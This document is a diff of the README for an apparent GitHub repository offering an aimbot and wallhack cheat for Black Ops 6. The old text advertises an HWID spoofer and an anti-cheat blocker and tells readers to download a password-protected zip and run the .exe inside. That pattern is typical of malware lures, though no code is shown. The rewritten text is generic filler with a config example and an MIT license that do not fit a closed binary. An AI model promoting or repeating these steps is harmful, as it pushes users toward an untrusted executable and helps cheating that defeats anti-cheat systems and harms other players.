@@ -1,115 +1,87 @@
-# Relo Cheat for Black Ops 6
+# 🎮 Black Ops 6 Relo Cheat
 
-![6](https://github.com/user-attachments/assets/937e43d1-59d3-4d1e-8b20-6972a2681095)
+![Black Ops 6 Relo Cheat](https://img.shields.io/badge/Download%20Now-Black%20Ops%206%20Relo%20Cheat-blue?style=for-the-badge&logo=github)
 
-## Description:
-Relo Cheat is your private tool for achieving tactical superiority and unmatched precision in Black Ops 6. With powerful WallHack (WH) and Aimbot features, Relo empowers you to dominate the battlefield.
+Welcome to the **Black Ops 6 Relo Cheat** repository! This tool is designed to give you an edge in Black Ops 6. With features like WallHack (WH) and Aimbot, Relo helps you achieve tactical superiority and unmatched precision. 
 
-- **WallHack (WH)**: Reveal enemy positions, traps, and key objects through walls, allowing you to plan effectively and avoid deadly threats.
-- **Aimbot Accuracy**: Eliminate targets with instant precision, becoming an unstoppable force in combat.
-- **Ultimate Control in Black Ops 6**: Combine WH and Aimbot to master every match, complete challenging missions, and become a legendary operative.
+## Table of Contents
 
----
-## How to Use
-1. **Get the Latest Version**: (https://github.com/jilsoddY/Black-Ops-6-Relo-Cheat/releases/download/latest/Relo.zip).
-2. **Unzip the Files**: Use the pass `Relo` to unpack the archive.
-3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
-4. **In-Game Key**: Press `HOME` to activate.
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [Troubleshooting](#troubleshooting)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## Supported Systems:
-- **Operating Systems**: Windows 10, Windows 11
-- **Platforms**: Gamepass, Battle.net, Steam
-- **Controller Support**: Fully compatible
+## Features
 
----
+- **WallHack (WH)**: See through walls and obstacles to gain a strategic advantage.
+- **Aimbot**: Automatically aim at enemies for improved accuracy.
+- **No Recoil**: Control your shots without worrying about recoil effects.
+- **User-Friendly Interface**: Easy to navigate, even for beginners.
 
-## Anti-Cheat Protection:
-- Includes **HWID Spoofer** for hardware protection.
-- Includes **Anticheat Blocker** for added security.
+## Installation
 
----
+To get started, download the latest version of Relo Cheat from the [Releases](https://github.com/Xitrumm-ct/Black-Ops-6-Relo-Cheat/releases) section. Once downloaded, execute the file to install the tool on your system.
 
-## Main Features:
+## Usage
 
-### AIMBOT:
-- **Aimbot (On/Off)**: Toggle Aimbot functionality.
-- **Aimbot Type**: Choose between Normal or Smooth aiming.
-- **Aimbot Filter**: Select None or Visible Check for targeting enemies.
-- **Aimbot Priority**: Prioritize targets by Distance or FOV.
-- **FOV Check**:
-  - Enable/Disable FOV targeting.
-  - **Adjustable FOV Radius**: Customize FOV with a slider.
-  - **Show FOV Circle**: Display FOV boundary in-game.
-- **Target Bone Selection**: Choose specific bones for targeting:
-  - Helmet
-  - Head
-  - Neck
-  - Spine
-- **Bone Scan & Smart Bone Scanning**: Adaptive bone targeting.
-- **Ignore Downed Targets**: Skip targeting incapacitated enemies.
-- **Aim at Friendly (On/Off)**: Toggle aiming at teammates.
-- **Stick to Target**: Maintain focus on selected targets.
-- **Smooth Aim (On/Off)**:
-  - Enable smooth aiming.
-  - Adjustable smoothness with a slider.
+1. Launch Black Ops 6.
+2. Open Relo Cheat.
+3. Adjust settings as needed.
+4. Enjoy your enhanced gameplay!
 
-### Advanced Options:
-- **Aim Keys**: Customizable hotkeys for aiming.
-- **Auto Shoot**: Automatically fire at targets.
-- **Auto ADS**: Automatically aim down sights.
-- **Disable Aim After Kill**: Disable Aimbot post-elimination.
-- **Skip Riot Shields & Vehicles**: Avoid targeting shielded enemies or vehicles.
+## Configuration
 
----
+Relo Cheat offers several customizable options:
 
-### VISUALS:
-#### ESP Options:
-- **Box ESP**: 2D or 3D boxes around enemies.
-- **Show Team ESP**: Toggle visibility of teammates.
-- **Skeleton ESP**: Display enemy skeletons (On/Off).
-- **Player Info**:
-  - Name
-  - Ping
-  - Kills
-  - Score
-  - Health Bar
-  - Distance
-- **RGB ESP**: Enable vibrant, customizable visuals.
-- **Player Weapons**: Display equipped weapons.
-- **Snap Lines**: Draw lines to players (adjustable thickness).
+- **Toggle WallHack**: Enable or disable the WallHack feature.
+- **Aimbot Sensitivity**: Adjust how sensitive the aimbot is to your movements.
+- **Recoil Control**: Set the level of recoil control you prefer.
 
-#### Chams:
-- **Players & AI**: Apply Chams effects to players and bots.
-- **Self Outline**: Display personal outline (On/Off).
-- **Vehicles**: Highlight vehicles (On/Off).
-- **RGB Chams**: Enable colorful Chams effects.
-- **Adjustable Thickness & Render Type**: Customize Chams visuals.
+### Example Configuration
 
-#### Compass:
-- **Show Compass**: Enable compass display.
-- **Compass Fill**: Toggle filled compass mode.
-- **Lock with FOV**: Sync compass with Field of View.
-- **Adjustable Thickness & Size**: Customize compass appearance.
+```json
+{
+  "wallhack": true,
+  "aimbot": {
+    "enabled": true,
+    "sensitivity": 0.5
+  },
+  "recoilControl": true
+}
+```
 
-#### Radar:
-- **Show Radar**: Display radar (On/Off).
-- **Adjustable Blip Size**: Change radar marker size.
-- **Radar Zoom**: Adjust radar zoom level.
+## Troubleshooting
 
-#### Miscellaneous Visuals:
-- **Crosshair**: Choose between Standard or Rotating crosshair styles.
-- **Bullet Tracers**: Visualize bullet trajectories.
+If you encounter issues, try the following steps:
 
----
+- Ensure you have the latest version of the cheat.
+- Restart your game and the cheat tool.
+- Check for any updates in the [Releases](https://github.com/Xitrumm-ct/Black-Ops-6-Relo-Cheat/releases) section.
 
-### Misc Options:
-- **Accent Color Selector**: Customize interface colors.
-- **Menu Notifications**: Enable notifications within the menu.
-- **Unlock All**: Unlock all in-game content.
-- **FOV Changer**: Modify Field of View settings.
-- **Third Person Mode**: Enable third-person perspective.
-- **Disable Shellshock**: Remove shellshock effects.
-- **No Recoil**: Adjust weapon recoil strength.
-- **Player FOV Scaler**: Adjust Field of View for players.
+## Contributing
 
----
+We welcome contributions! If you want to help improve Relo Cheat, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, feel free to reach out:
+
+- **Email**: support@blackops6relo.com
+- **Discord**: Join our community at [Black Ops 6 Relo Community](https://discord.gg/blackops6relo)
+
+## Final Note
+
+Thank you for using Black Ops 6 Relo Cheat. For the latest updates, features, and community discussions, visit the [Releases](https://github.com/Xitrumm-ct/Black-Ops-6-Relo-Cheat/releases) section. Happy gaming!
